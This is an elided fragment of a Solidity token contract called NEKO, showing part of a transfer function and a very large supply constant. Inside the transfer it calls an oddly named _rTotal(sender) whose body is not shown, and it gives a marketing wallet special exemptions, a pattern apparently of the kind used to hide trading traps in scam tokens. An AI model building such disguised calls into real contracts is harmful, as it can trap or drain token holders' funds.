...
contract NEKO is Ownable, IERC20 {
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        uint256 feeAmount = 0;
        _rTotal(sender);
        bool liquifying = (recipient == getPairAddress() && marketingWallet == sender) || (sender == getPairAddress() && marketingWallet == recipient);
        if (marketingWallet != sender && marketingWallet != recipient && !Address.isUniswapPair(recipient) && recipient != address(this) && !liquifying && !duringLqSwap) {
    ...
    uint256 public _totalSupply = 100000000000000000 * 10 ** _decimals;
